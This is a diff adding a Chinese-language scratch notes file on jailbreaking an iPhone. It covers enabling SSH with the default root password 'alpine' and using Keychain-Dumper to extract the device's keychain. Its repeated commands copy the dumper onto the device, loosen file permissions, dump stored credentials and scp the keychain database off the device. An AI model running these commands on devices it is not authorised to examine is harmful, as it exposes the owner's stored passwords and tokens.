@@ -1,0 +1,85 @@
+越狱地址
+https://next.tweakboxapp.com/
+
+
+
+
+
+
+
+Windows
+下载PP助手Windows版本
+用USB数据线连接手机和电脑
+等待PP助手自动安装支持组件
+手机如果弹出是否信任窗口，选择信任电脑
+
+
+
+如果无法加载，安装乐网，开起全局拦截
+OpenSSH
+默认密码：alpine
+MobileTerminal
+
+
+
+/private/var/Keychains root# chmod +r keychain-2.db
+
+
+
+ssh root@172.16.4.90
+alpine
+cd /private/var/Keychains/
+scp /Users/liqiang/Downloads/Keychain-Dumper-master/keychain_dumper root@172.16.4.90:/bin/keychain_dumper
+scp /Users/liqiang/Downloads/Keychain-Dumper-master/keychain_dumper root@172.16.4.90:/tmp
+scp root@172.16.4.90:/private/var/Keychains/keychain-2.db ~/Desktop/
+scp root@172.16.4.90:/private/var/Keychains/keychain-export002.txt ~/Desktop/
+
+
+scp root@172.16.4.90:/private/var/Keychains/keychain-2.db ~/Desktop/
+scp root@172.16.4.90:/private/var/Keychains/keychain-export.txt ~/Desktop/
+
+root@172.16.4.90:/private/var/Keychains root# /bin/keychain_dumper > ~/Desktop/keychain-export.txt
+root@172.16.4.90:/private/var/Keychains root# /bin/keychain_dumper > ~/Desktop/bbb
+
+scp root@172.16.4.90:/private/var/Keychains/ ~/Desktop/aaa
+
+
+/bin/keychain_dumper > keychain-export002.txt
+/tmp/keychain_dumper > keychain-export5.txt
+
+
+ls -l /tmp/keychain_dumper
+ls -l /private/var/Keychains/keychain-2.db
+
+chmod +x /private/var/Keychains/keychain-2.db
+
+/bin/keychain_dumper > keychain-export3.txt
+
+/tmp/keychain_dump -h
+
+chmod 777 /bin/keychain_dumper
+
+chmod +r /bin/keychain_dumper
+chmod +r keychain-2.db
+
+rm -f file.log
+
+
+
+ldid -S keychain_dumper
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+scp root@172.16.4.90:/private/var/Keychains/ > ~/Desktop/beifen/
+scp -r root@172.16.4.90:/private/var/Keychains/ ~/Desktop/beifen/
